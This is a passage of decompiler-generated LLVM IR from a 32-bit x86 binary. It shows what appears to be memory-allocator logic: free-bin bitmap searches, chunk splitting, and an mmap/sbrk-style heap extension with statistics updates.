dec_label_pc_804b913:                             ; preds = %dec_label_pc_804b8fb
  %v2_804b917 = add i32 %v0_804b907, %v1_804bac4
  store i32 %v2_804b917, i32* @edx, align 4
  %v1_804b91a = or i32 %v1_804bac4, 1
  store i32 %v1_804b91a, i32* %ebx.global-to-local, align 4
  %v2_804b91d = add i32 %v0_804b907, 4
  %v3_804b91d = inttoptr i32 %v2_804b91d to i32*
  store i32 %v1_804b91a, i32* %v3_804b91d, align 4
  %v0_804b920 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b922 = or i32 %v0_804b920, 1
  store i32 %v1_804b922, i32* %eax.global-to-local, align 4
  %v0_804b925 = load i32, i32* @edx, align 4
  %v1_804b925 = load i32, i32* @ebp, align 4
  %v2_804b925 = add i32 %v1_804b925, 8
  %v3_804b925 = inttoptr i32 %v2_804b925 to i32*
  store i32 %v0_804b925, i32* %v3_804b925, align 4
  %v0_804b928 = load i32, i32* @edx, align 4
  %v1_804b928 = load i32, i32* @ebp, align 4
  %v2_804b928 = add i32 %v1_804b928, 12
  %v3_804b928 = inttoptr i32 %v2_804b928 to i32*
  store i32 %v0_804b928, i32* %v3_804b928, align 4
  %v0_804b92b = load i32, i32* @edx, align 4
  %v1_804b92b = add i32 %v0_804b92b, 8
  %v2_804b92b = inttoptr i32 %v1_804b92b to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804b92b, align 4
  %v0_804b932 = load i32, i32* @edx, align 4
  %v1_804b932 = add i32 %v0_804b932, 12
  %v2_804b932 = inttoptr i32 %v1_804b932 to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804b932, align 4
  %v0_804b939 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b939 = load i32, i32* @edx, align 4
  %v2_804b939 = add i32 %v1_804b939, 4
  %v3_804b939 = inttoptr i32 %v2_804b939 to i32*
  store i32 %v0_804b939, i32* %v3_804b939, align 4
  %v0_804b93c = load i32, i32* %esi.global-to-local, align 4
  %v1_804b93c = load i32, i32* @edx, align 4
  %v3_804b93c = add i32 %v1_804b93c, %v0_804b93c
  %v4_804b93c = inttoptr i32 %v3_804b93c to i32*
  store i32 %v0_804b93c, i32* %v4_804b93c, align 4
  br label %dec_label_pc_804be3e

dec_label_pc_804b946:                             ; preds = %dec_label_pc_804b8da, %dec_label_pc_804b8ca
  %v4_804b8f1 = phi i32 [ %storemerge1.pre, %dec_label_pc_804b8ca ], [ %v3_804b8dd, %dec_label_pc_804b8da ]
  store i32 %v4_804b8f1, i32* %eax.global-to-local, align 4
  %v12_804b946 = icmp eq i32 %v4_804b8f1, %v2_804b8ce
  %v1_804b948 = icmp eq i1 %v12_804b946, false
  br i1 %v1_804b948, label %dec_label_pc_804b8da, label %dec_label_pc_804b94a.loopexit

dec_label_pc_804b94a.loopexit:                    ; preds = %dec_label_pc_804b946
  br label %dec_label_pc_804b94a

dec_label_pc_804b94a:                             ; preds = %dec_label_pc_804b94a.loopexit, %dec_label_pc_804b8bc
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804b953 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804b953, i32* %ecx.global-to-local, align 4
  %v2_804b956 = udiv i32 %v1_804b953, 32
  store i32 %v2_804b956, i32* @edi, align 4
  %v1_804b959 = mul nuw nsw i32 %v2_804b956, 4
  %v2_804b959 = add i32 %v1_804b959, ptrtoint (i32* @global_var_804fa94.84 to i32)
  %v3_804b959 = inttoptr i32 %v2_804b959 to i32*
  %v4_804b959 = load i32, i32* %v3_804b959, align 4
  store i32 %v4_804b959, i32* %edx.global-to-local, align 4
  %v1_804b960 = mul i32 %v1_804b953, 8
  %v2_804b960 = add i32 %v1_804b960, ptrtoint (i32* @global_var_804f78c.80 to i32)
  store i32 %v2_804b960, i32* %ebx.global-to-local, align 4
  %v1_804b967 = urem i32 %v1_804b953, 32
  %v2_804b967 = icmp eq i32 %v1_804b967, 0
  store i32 %v1_804b967, i32* %ecx.global-to-local, align 4
  br i1 %v2_804b967, label %.preheader, label %bb86

bb86:                                             ; preds = %dec_label_pc_804b94a
  %v5_804b96a = shl i32 1, %v1_804b967
  store i32 %v5_804b96a, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804b94a, %bb86, %dec_label_pc_804b9ab
  %v1_804b96c = phi i32 [ %v1_804b96c.pre, %dec_label_pc_804b9ab ], [ %v4_804b959, %bb86 ], [ %v4_804b959, %dec_label_pc_804b94a ]
  %v0_804b970 = phi i32 [ %v0_804b96c.pre, %dec_label_pc_804b9ab ], [ %v5_804b96a, %bb86 ], [ 1, %dec_label_pc_804b94a ]
  %tmp87 = icmp ule i32 %v0_804b970, %v1_804b96c
  %v1_804b970 = icmp eq i32 %v0_804b970, 0
  %v1_804b972 = icmp eq i1 %v1_804b970, false
  %or.cond = and i1 %tmp87, %v1_804b972
  br i1 %or.cond, label %dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge, label %dec_label_pc_804b974.preheader

dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge: ; preds = %.preheader
  %v0_804b99b7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9a0.preheader

dec_label_pc_804b974.preheader:                   ; preds = %.preheader
  %v0_804b974.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804b974

dec_label_pc_804b974:                             ; preds = %dec_label_pc_804b974.preheader, %dec_label_pc_804b97e
  %v0_804b974 = phi i32 [ %v0_804b974.pre, %dec_label_pc_804b974.preheader ], [ %v1_804b974, %dec_label_pc_804b97e ]
  %v1_804b974 = add i32 %v0_804b974, 1
  store i32 %v1_804b974, i32* @edi, align 4
  %v6_804b978 = icmp ugt i32 %v1_804b974, 2
  br i1 %v6_804b978, label %dec_label_pc_804ba2f.loopexit, label %dec_label_pc_804b97e

dec_label_pc_804b97e:                             ; preds = %dec_label_pc_804b974
  %v1_804b97e = mul i32 %v1_804b974, 4
  %v2_804b97e = add i32 %v1_804b97e, ptrtoint (i32* @global_var_804fa94.84 to i32)
  %v3_804b97e = inttoptr i32 %v2_804b97e to i32*
  %v4_804b97e = load i32, i32* %v3_804b97e, align 4
  store i32 %v4_804b97e, i32* %edx.global-to-local, align 4
  %v1_804b985 = icmp eq i32 %v4_804b97e, 0
  br i1 %v1_804b985, label %dec_label_pc_804b974, label %dec_label_pc_804b989

dec_label_pc_804b989:                             ; preds = %dec_label_pc_804b97e
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804b990 = mul i32 %v1_804b974, 256
  store i32 %v2_804b990, i32* %eax.global-to-local, align 4
  %v1_804b993 = add i32 %v2_804b990, ptrtoint (i32* @global_var_804f78c.80 to i32)
  store i32 %v1_804b993, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9a0.preheader

dec_label_pc_804b9a0.preheader:                   ; preds = %dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge, %dec_label_pc_804b989
  %v0_804b99b7 = phi i32 [ %v1_804b993, %dec_label_pc_804b989 ], [ %v0_804b99b7.pre, %dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804b989 ], [ %v0_804b970, %dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge ]
  %v0_804b9b1 = phi i32 [ %v4_804b97e, %dec_label_pc_804b989 ], [ %v1_804b96c, %dec_label_pc_804b970.dec_label_pc_804b9a0.preheader_crit_edge ]
  %v2_804b9a04 = and i32 %v0_804b9b1, %esi.promoted
  %v3_804b9a05 = icmp eq i32 %v2_804b9a04, 0
  br i1 %v3_804b9a05, label %dec_label_pc_804b99b, label %dec_label_pc_804b9a4

dec_label_pc_804b99b:                             ; preds = %dec_label_pc_804b9a0.preheader, %dec_label_pc_804b99b
  %v2_804b99e18 = phi i32 [ %v2_804b99e, %dec_label_pc_804b99b ], [ %esi.promoted, %dec_label_pc_804b9a0.preheader ]
  %v0_804b99b8 = phi i32 [ %v1_804b99b, %dec_label_pc_804b99b ], [ %v0_804b99b7, %dec_label_pc_804b9a0.preheader ]
  %v1_804b99b = add i32 %v0_804b99b8, 8
  %v2_804b99e = mul i32 %v2_804b99e18, 2
  %v2_804b9a0 = and i32 %v2_804b99e, %v0_804b9b1
  %v3_804b9a0 = icmp eq i32 %v2_804b9a0, 0
  br i1 %v3_804b9a0, label %dec_label_pc_804b99b, label %dec_label_pc_804b9a0.dec_label_pc_804b9a4_crit_edge

dec_label_pc_804b9a0.dec_label_pc_804b9a4_crit_edge: ; preds = %dec_label_pc_804b99b
  store i32 %v1_804b99b, i32* %ebx.global-to-local, align 4
  store i32 %v2_804b99e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b9a4

dec_label_pc_804b9a4:                             ; preds = %dec_label_pc_804b9a0.dec_label_pc_804b9a4_crit_edge, %dec_label_pc_804b9a0.preheader
  %v0_804b9ab = phi i32 [ %v2_804b99e, %dec_label_pc_804b9a0.dec_label_pc_804b9a4_crit_edge ], [ %esi.promoted, %dec_label_pc_804b9a0.preheader ]
  %v1_804b9ce = phi i32 [ %v1_804b99b, %dec_label_pc_804b9a0.dec_label_pc_804b9a4_crit_edge ], [ %v0_804b99b7, %dec_label_pc_804b9a0.preheader ]
  %v1_804b9a4 = add i32 %v1_804b9ce, 12
  %v2_804b9a4 = inttoptr i32 %v1_804b9a4 to i32*
  %v3_804b9a4 = load i32, i32* %v2_804b9a4, align 4
  store i32 %v3_804b9a4, i32* @ecx, align 4
  %v12_804b9a7 = icmp eq i32 %v3_804b9a4, %v1_804b9ce
  %v1_804b9a9 = icmp eq i1 %v12_804b9a7, false
  br i1 %v1_804b9a9, label %dec_label_pc_804b9bf, label %dec_label_pc_804b9ab

dec_label_pc_804b9ab:                             ; preds = %dec_label_pc_804b9a4
  %v2_804b9ad = mul i32 %v0_804b9ab, 2
  store i32 %v2_804b9ad, i32* %esi.global-to-local, align 4
  %v1_804b9af = sub i32 -1, %v0_804b9ab
  store i32 %v1_804b9af, i32* %eax.global-to-local, align 4
  %v2_804b9b1 = and i32 %v0_804b9b1, %v1_804b9af
  store i32 %v2_804b9b1, i32* %edx.global-to-local, align 4
  %v1_804b9b3 = add i32 %v3_804b9a4, 8
  store i32 %v1_804b9b3, i32* %ebx.global-to-local, align 4
  %v1_804b9b6 = load i32, i32* @edi, align 4
  %v2_804b9b6 = mul i32 %v1_804b9b6, 4
  %v3_804b9b6 = add i32 %v2_804b9b6, ptrtoint (i32* @global_var_804fa94.84 to i32)
  %v4_804b9b6 = inttoptr i32 %v3_804b9b6 to i32*
  store i32 %v2_804b9b1, i32* %v4_804b9b6, align 4
  %v0_804b96c.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804b96c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804b9bf:                             ; preds = %dec_label_pc_804b9a4
  %v1_804b9bf = add i32 %v3_804b9a4, 4
  %v2_804b9bf = inttoptr i32 %v1_804b9bf to i32*
  %v3_804b9bf = load i32, i32* %v2_804b9bf, align 4
  store i32 %v3_804b9bf, i32* %edx.global-to-local, align 4
  %v1_804b9c2 = add i32 %v3_804b9a4, 12
  %v2_804b9c2 = inttoptr i32 %v1_804b9c2 to i32*
  %v3_804b9c2 = load i32, i32* %v2_804b9c2, align 4
  store i32 %v3_804b9c2, i32* %eax.global-to-local, align 4
  %v1_804b9c5 = and i32 %v3_804b9bf, -4
  store i32 %v1_804b9c5, i32* @edx, align 4
  %v5_804b9ca = sub i32 %v1_804b9c5, %v1_804bac4
  store i32 %v5_804b9ca, i32* %esi.global-to-local, align 4
  store i32 %v3_804b9c2, i32* %v2_804b9a4, align 4
  %v0_804b9d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b9d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b9d1 = add i32 %v1_804b9d1, 8
  %v3_804b9d1 = inttoptr i32 %v2_804b9d1 to i32*
  store i32 %v0_804b9d1, i32* %v3_804b9d1, align 4
  %v0_804b9d4 = load i32, i32* %esi.global-to-local, align 4
  %tmp129 = icmp ult i32 %v0_804b9d4, 16
  %v0_804b9d9 = load i32, i32* @ecx, align 4
  br i1 %tmp129, label %dec_label_pc_804b9d9, label %dec_label_pc_804b9e0

dec_label_pc_804b9d9:                             ; preds = %dec_label_pc_804b9bf
  %v1_804b9d9 = load i32, i32* @edx, align 4
  %v2_804b9d9 = add i32 %v0_804b9d9, 4
  %v3_804b9d9 = add i32 %v2_804b9d9, %v1_804b9d9
  %v4_804b9d9 = inttoptr i32 %v3_804b9d9 to i32*
  %v5_804b9d9 = load i32, i32* %v4_804b9d9, align 4
  %v6_804b9d9 = or i32 %v5_804b9d9, 1
  store i32 %v6_804b9d9, i32* %v4_804b9d9, align 4
  br label %dec_label_pc_804ba27

dec_label_pc_804b9e0:                             ; preds = %dec_label_pc_804b9bf
  %v2_804b9e4 = add i32 %v0_804b9d9, %v1_804bac4
  store i32 %v2_804b9e4, i32* %eax.global-to-local, align 4
  %v1_804b9ed = load i32, i32* @ebp, align 4
  %v2_804b9ed = add i32 %v1_804b9ed, 8
  %v3_804b9ed = inttoptr i32 %v2_804b9ed to i32*
  store i32 %v2_804b9e4, i32* %v3_804b9ed, align 4
  %v0_804b9f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9f0 = load i32, i32* @ebp, align 4
  %v2_804b9f0 = add i32 %v1_804b9f0, 12
  %v3_804b9f0 = inttoptr i32 %v2_804b9f0 to i32*
  store i32 %v0_804b9f0, i32* %v3_804b9f0, align 4
  %v0_804b9f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9f3 = add i32 %v0_804b9f3, 8
  %v2_804b9f3 = inttoptr i32 %v1_804b9f3 to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804b9f3, align 4
  %v0_804b9fa = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9fa = add i32 %v0_804b9fa, 12
  %v2_804b9fa = inttoptr i32 %v1_804b9fa to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804b9fa, align 4
  %v0_804ba01 = load i32, i32* @global_var_804f790.81, align 16
  %v4_804ba07 = load i32, i32* %eax.global-to-local, align 4
  %v5_804ba07 = select i1 %v8_804b76d, i32 %v4_804ba07, i32 %v0_804ba01
  %v4_804ba0a = or i32 %v1_804bac4, 1
  store i32 %v5_804ba07, i32* @global_var_804f790.81, align 16
  %v0_804ba15 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804ba0a, i32* %ebx.global-to-local, align 4
  %v1_804ba1b = or i32 %v0_804ba15, 1
  store i32 %v1_804ba1b, i32* @edx, align 4
  %v3_804ba1e = add i32 %v0_804ba15, %v4_804ba07
  %v4_804ba1e = inttoptr i32 %v3_804ba1e to i32*
  store i32 %v0_804ba15, i32* %v4_804ba1e, align 4
  %v0_804ba21 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba21 = load i32, i32* @ecx, align 4
  %v2_804ba21 = add i32 %v1_804ba21, 4
  %v3_804ba21 = inttoptr i32 %v2_804ba21 to i32*
  store i32 %v0_804ba21, i32* %v3_804ba21, align 4
  %v0_804ba24 = load i32, i32* @edx, align 4
  %v1_804ba24 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ba24 = add i32 %v1_804ba24, 4
  %v3_804ba24 = inttoptr i32 %v2_804ba24 to i32*
  store i32 %v0_804ba24, i32* %v3_804ba24, align 4
  br label %dec_label_pc_804ba27

dec_label_pc_804ba27:                             ; preds = %dec_label_pc_804bb1b, %dec_label_pc_804b9d9, %dec_label_pc_804b9e0
  %v0_804ba27 = load i32, i32* @ecx, align 4
  %v1_804ba27 = add i32 %v0_804ba27, 8
  store i32 %v1_804ba27, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804ba2f.loopexit:                    ; preds = %dec_label_pc_804b974
  br label %dec_label_pc_804ba2f

dec_label_pc_804ba2f:                             ; preds = %dec_label_pc_804ba2f.loopexit, %dec_label_pc_804b72f, %dec_label_pc_804b737
  %v0_804ba2f = load i32, i32* @global_var_804f78c.80, align 4
  store i32 %v0_804ba2f, i32* @ebx, align 4
  store i32 %v1_804bac4, i32* %esi.global-to-local, align 4
  %v1_804ba39 = add i32 %v0_804ba2f, 4
  %v2_804ba39 = inttoptr i32 %v1_804ba39 to i32*
  %v3_804ba39 = load i32, i32* %v2_804ba39, align 4
  %v1_804ba3c = add i32 %v1_804bac4, 16
  store i32 %v1_804ba3c, i32* @esi, align 4
  %v1_804ba43 = and i32 %v3_804ba39, -4
  store i32 %v1_804ba43, i32* %ecx.global-to-local, align 4
  %v7_804ba46 = icmp ult i32 %v1_804ba43, %v1_804ba3c
  br i1 %v7_804ba46, label %dec_label_pc_804ba66, label %dec_label_pc_804ba4a

dec_label_pc_804ba4a:                             ; preds = %dec_label_pc_804ba2f
  %v2_804ba4e = add i32 %v0_804ba2f, %v1_804bac4
  store i32 %v2_804ba4e, i32* @edx, align 4
  %v1_804ba51 = or i32 %v1_804bac4, 1
  store i32 %v1_804ba51, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba4e, i32* @global_var_804f78c.80, align 4
  store i32 %v1_804ba51, i32* %v2_804ba39, align 4
  %v0_804ba5d = load i32, i32* %ecx.global-to-local, align 4
  %v5_804ba5d = sub i32 %v0_804ba5d, %v1_804bac4
  store i32 %v5_804ba5d, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804bddf

dec_label_pc_804ba66:                             ; preds = %dec_label_pc_804ba2f
  %v0_804ba66 = load i8, i8* @global_var_804f760.79, align 32
  %v1_804ba66 = and i8 %v0_804ba66, 2
  %v2_804ba66 = icmp eq i8 %v1_804ba66, 0
  %v0_804ba6d = load i32, i32* @global_var_804fabc.85, align 4
  store i32 %v0_804ba6d, i32* %edx.global-to-local, align 4
  br i1 %v2_804ba66, label %dec_label_pc_804ba9a, label %dec_label_pc_804ba75

dec_label_pc_804ba75:                             ; preds = %dec_label_pc_804ba66
  store i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32* %stack_var_-92, align 4
  %v2_804ba7d = call i32 @function_804bfeb(i32* bitcast (i8* @global_var_804f760.79 to i32*))
  store i32 ptrtoint (i8* @global_var_804f760.79 to i32), i32* @ebx, align 4
  %v1_804ba87 = add i32 %v1_804bac4, -7
  store i32 %v1_804ba87, i32* %eax.global-to-local, align 4
  store i32 %v1_804ba87, i32* %stack_var_-92, align 4
  %v1_804ba8b = call i32 @function_804b6c8(i32 %v1_804ba87)
  store i32 %v1_804ba8b, i32* %eax.global-to-local, align 4
  store i32 %v1_804ba8b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804ba9a:                             ; preds = %dec_label_pc_804ba66
  store i32 %v1_804bac4, i32* @ebx, align 4
  %v1_804ba9e = add i32 %v0_804ba6d, -1
  store i32 %v1_804ba9e, i32* @ecx, align 4
  %v1_804baa1 = load i32, i32* @global_var_804faac.86, align 4
  %v7_804baa1 = icmp ult i32 %v1_804bac4, %v1_804baa1
  br i1 %v7_804baa1, label %dec_label_pc_804bb7c, label %dec_label_pc_804bab1

dec_label_pc_804bab1:                             ; preds = %dec_label_pc_804ba9a
  %v0_804bab1 = load i32, i32* @global_var_804fab0.87, align 16
  store i32 %v0_804bab1, i32* %eax.global-to-local, align 4
  %v1_804bab6 = load i32, i32* @global_var_804fab4.88, align 4
  %v5_804babc = icmp slt i32 %v0_804bab1, %v1_804bab6
  br i1 %v5_804babc, label %dec_label_pc_804bac2, label %dec_label_pc_804bb7c

dec_label_pc_804bac2:                             ; preds = %dec_label_pc_804bab1
  %v2_804bac4 = add i32 %v1_804bac4, 10
  %v3_804bac4 = add i32 %v2_804bac4, %v0_804ba6d
  %v1_804bac8 = sub i32 0, %v0_804ba6d
  store i32 %v1_804bac8, i32* %eax.global-to-local, align 4
  %v2_804baca = and i32 %v3_804bac4, %v1_804bac8
  store i32 %v2_804baca, i32* @ebx, align 4
  %tmp130 = icmp ugt i32 %v2_804baca, %v1_804bac4
  br i1 %tmp130, label %dec_label_pc_804bad6, label %dec_label_pc_804bb7c

dec_label_pc_804bad6:                             ; preds = %dec_label_pc_804bac2
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804bae3 = call i32 @function_804cad4(i32 0, i32 %v2_804baca, i32 3, i32 34, i32 0, i32 0, i32 %v1_804ba9e, i32 %v1_804ba9e)
  store i32 %v8_804bae3, i32* %eax.global-to-local, align 4
  %v10_804baeb = icmp eq i32 %v8_804bae3, -1
  store i32 %v8_804bae3, i32* %edx.global-to-local, align 4
  br i1 %v10_804baeb, label %dec_label_pc_804bad6.dec_label_pc_804bb7c_crit_edge, label %dec_label_pc_804baf6

dec_label_pc_804bad6.dec_label_pc_804bb7c_crit_edge: ; preds = %dec_label_pc_804bad6
  %v0_804bb7c.pre = load i32, i32* @global_var_804f78c.80, align 4
  br label %dec_label_pc_804bb7c

dec_label_pc_804baf6:                             ; preds = %dec_label_pc_804bad6
  %v1_804baf8 = urem i32 %v8_804bae3, 8
  %v2_804baf8 = icmp eq i32 %v1_804baf8, 0
  store i32 %v1_804baf8, i32* %ecx.global-to-local, align 4
  br i1 %v2_804baf8, label %dec_label_pc_804bb11, label %dec_label_pc_804bafd

dec_label_pc_804bafd:                             ; preds = %dec_label_pc_804baf6
  %v0_804bb02 = load i32, i32* @ebx, align 4
  %v2_804bb04 = sub nsw i32 8, %v1_804baf8
  store i32 %v2_804bb04, i32* %eax.global-to-local, align 4
  %v2_804bb06 = add i32 %v2_804bb04, %v8_804bae3
  store i32 %v2_804bb06, i32* @ecx, align 4
  %v2_804bb09 = sub i32 %v0_804bb02, %v2_804bb04
  store i32 %v2_804bb09, i32* %esi.global-to-local, align 4
  %v2_804bb0b = inttoptr i32 %v2_804bb06 to i32*
  store i32 %v2_804bb04, i32* %v2_804bb0b, align 4
  br label %dec_label_pc_804bb1b

dec_label_pc_804bb11:                             ; preds = %dec_label_pc_804baf6
  store i32 %v8_804bae3, i32* @ecx, align 4
  %v1_804bb13 = inttoptr i32 %v8_804bae3 to i32*
  store i32 0, i32* %v1_804bb13, align 4
  br label %dec_label_pc_804bb1b

dec_label_pc_804bb1b:                             ; preds = %dec_label_pc_804bafd, %dec_label_pc_804bb11
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804bafd ], [ @ebx, %dec_label_pc_804bb11 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804bb1b = or i32 %storemerge, 2
  %v1_804bb1e = load i32, i32* @ecx, align 4
  %v2_804bb1e = add i32 %v1_804bb1e, 4
  %v3_804bb1e = inttoptr i32 %v2_804bb1e to i32*
  store i32 %v1_804bb1b, i32* %v3_804bb1e, align 4
  %v0_804bb21 = load i32, i32* @global_var_804fab0.87, align 16
  %v0_804bb26 = load i32, i32* @global_var_804fad0.89, align 16
  %v1_804bb2c = add i32 %v0_804bb21, 1
  %v1_804bb2d = load i32, i32* @global_var_804fab8.90, align 8
  %v2_804bb2d = sub i32 %v1_804bb2c, %v1_804bb2d
  %v8_804bb2d = xor i32 %v1_804bb2d, %v1_804bb2c
  %v9_804bb2d = xor i32 %v2_804bb2d, %v1_804bb2c
  %v10_804bb2d = and i32 %v9_804bb2d, %v8_804bb2d
  %v11_804bb2d = icmp slt i32 %v10_804bb2d, 0
  %v12_804bb2d = icmp eq i32 %v2_804bb2d, 0
  %v13_804bb2d = icmp slt i32 %v2_804bb2d, 0
  store i32 %v1_804bb2c, i32* @global_var_804fab0.87, align 16
  %v3_804bb38 = icmp ne i1 %v13_804bb2d, %v11_804bb2d
  %v4_804bb38 = or i1 %v12_804bb2d, %v3_804bb38
  %v7_804bb38 = select i1 %v4_804bb38, i32 %v1_804bb2d, i32 %v1_804bb2c
  store i32 %v7_804bb38, i32* @global_var_804fab8.90, align 8
  %v0_804bb44 = load i32, i32* @global_var_804fac4.91, align 4
  %v1_804bb49 = load i32, i32* @ebx, align 4
  %v2_804bb49 = add i32 %v1_804bb49, %v0_804bb44
  store i32 %v2_804bb49, i32* @global_var_804fac4.91, align 4
  %tmp89 = icmp ule i32 %v2_804bb49, %v0_804bb26
  %v5_804bb56 = select i1 %tmp89, i32 %v0_804bb26, i32 %v2_804bb49
  store i32 %v5_804bb56, i32* @edx, align 4
  %v1_804bb59 = load i32, i32* @global_var_804fac8.92, align 8
  %v2_804bb59 = add i32 %v1_804bb59, %v2_804bb49
  store i32 %v5_804bb56, i32* @global_var_804fad0.89, align 16
  %v1_804bb65 = load i32, i32* @global_var_804fad4.93, align 4
  %tmp131 = icmp ule i32 %v2_804bb59, %v1_804bb65
  %v5_804bb6b = select i1 %tmp131, i32 %v1_804bb65, i32 %v2_804bb59
  store i32 %v5_804bb6b, i32* %eax.global-to-local, align 4
  store i32 %v5_804bb6b, i32* @global_var_804fad4.93, align 4
  br label %dec_label_pc_804ba27

dec_label_pc_804bb7c:                             ; preds = %dec_label_pc_804bac2, %dec_label_pc_804bad6.dec_label_pc_804bb7c_crit_edge, %dec_label_pc_804bab1, %dec_label_pc_804ba9a
  %v0_804bb7c = phi i32 [ %v0_804bb7c.pre, %dec_label_pc_804bad6.dec_label_pc_804bb7c_crit_edge ], [ %v0_804ba2f, %dec_label_pc_804bab1 ], [ %v0_804ba2f, %dec_label_pc_804bac2 ], [ %v0_804ba2f, %dec_label_pc_804ba9a ]
  store i32 %v0_804bb7c, i32* %eax.global-to-local, align 4
  %v1_804bb85 = add i32 %v0_804bb7c, 4
  %v2_804bb85 = inttoptr i32 %v1_804bb85 to i32*
  %v3_804bb85 = load i32, i32* %v2_804bb85, align 4
  %v1_804bb8c = and i32 %v3_804bb85, -4
  %v2_804bb8c = icmp eq i32 %v1_804bb8c, 0
  store i32 %v1_804bb8c, i32* @ebp, align 4
  %v1_804bb92 = load i32, i32* @global_var_804faa8.94, align 8
  %v0_804bb9c = load i8, i8* @global_var_804fac0.95, align 64
  %v1_804bb9c = urem i8 %v0_804bb9c, 2
  %v2_804bb9c = icmp eq i8 %v1_804bb9c, 0
  %v1_804bba3 = icmp eq i1 %v2_804bb9c, false
  %v1_804bb8c.op = sub i32 0, %v1_804bb8c
  %v2_804bb9a.neg = select i1 %v1_804bba3, i32 %v1_804bb8c.op, i32 0
  %v2_804bb92 = add i32 %v1_804ba9e, %v1_804ba3c
  %v4_804bba3 = add i32 %v2_804bb92, %v1_804bb92
  %v5_804bbaa = add i32 %v4_804bba3, %v2_804bb9a.neg
  store i32 %v5_804bbaa, i32* %eax.global-to-local, align 4
  %v1_804bbae = sub i32 0, %v0_804ba6d
  store i32 %v1_804bbae, i32* @edx, align 4
  %v2_804bbb2 = and i32 %v5_804bbaa, %v1_804bbae
  store i32 %v2_804bbb2, i32* @esi, align 4
  %tmp90 = icmp slt i32 %v2_804bbb2, 1
  br i1 %tmp90, label %dec_label_pc_804bbd0, label %dec_label_pc_804bbba

dec_label_pc_804bbba:                             ; preds = %dec_label_pc_804bb7c
  store i32 %v2_804bbb2, i32* %stack_var_-92, align 4
  %v1_804bbbe = call i32 @function_804cee4(i32 %v2_804bbb2)
  store i32 %v1_804bbbe, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_804bbc9 = icmp eq i32 %v1_804bbbe, -1
  store i32 %v1_804bbbe, i32* @ebx, align 4
  %v1_804bbce = icmp eq i1 %v10_804bbc9, false
  br i1 %v1_804bbce, label %dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge, label %dec_label_pc_804bbba.dec_label_pc_804bbd0_crit_edge

dec_label_pc_804bbba.dec_label_pc_804bbd0_crit_edge: ; preds = %dec_label_pc_804bbba
  %v0_804bbd0.pre = load i8, i8* @global_var_804fac0.95, align 64
  br label %dec_label_pc_804bbd0

dec_label_pc_804bbd0:                             ; preds = %dec_label_pc_804bbba.dec_label_pc_804bbd0_crit_edge, %dec_label_pc_804bb7c
  %v0_804bbfd = phi i32 [ -1, %dec_label_pc_804bbba.dec_label_pc_804bbd0_crit_edge ], [ %v1_804bbae, %dec_label_pc_804bb7c ]
  %v0_804bbd0 = phi i8 [ %v0_804bbd0.pre, %dec_label_pc_804bbba.dec_label_pc_804bbd0_crit_edge ], [ %v0_804bb9c, %dec_label_pc_804bb7c ]
  %v1_804bbd0 = urem i8 %v0_804bbd0, 2
  %v2_804bbd0 = icmp eq i8 %v1_804bbd0, 0
  br i1 %v2_804bbd0, label %dec_label_pc_804bbd0.dec_label_pc_804bbe5_crit_edge, label %dec_label_pc_804bbd9

dec_label_pc_804bbd0.dec_label_pc_804bbe5_crit_edge: ; preds = %dec_label_pc_804bbd0
  %v0_804bbe5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bbe5

dec_label_pc_804bbd9:                             ; preds = %dec_label_pc_804bbd0
  %v2_804bbdd = add i32 %v1_804bb8c, %v1_804ba9e
  store i32 %v2_804bbdd, i32* %eax.global-to-local, align 4
  %v0_804bbdf = load i32, i32* @esi, align 4
  %v2_804bbdf = add i32 %v0_804bbdf, %v2_804bbdd
  %v5_804bbe1 = and i32 %v2_804bbdf, %v1_804bbae
  store i32 %v5_804bbe1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bbe5

dec_label_pc_804bbe5:                             ; preds = %dec_label_pc_804bbd0.dec_label_pc_804bbe5_crit_edge, %dec_label_pc_804bbd9
  %v3_804bbf0 = phi i32 [ %v0_804bbe5.pre, %dec_label_pc_804bbd0.dec_label_pc_804bbe5_crit_edge ], [ %v5_804bbe1, %dec_label_pc_804bbd9 ]
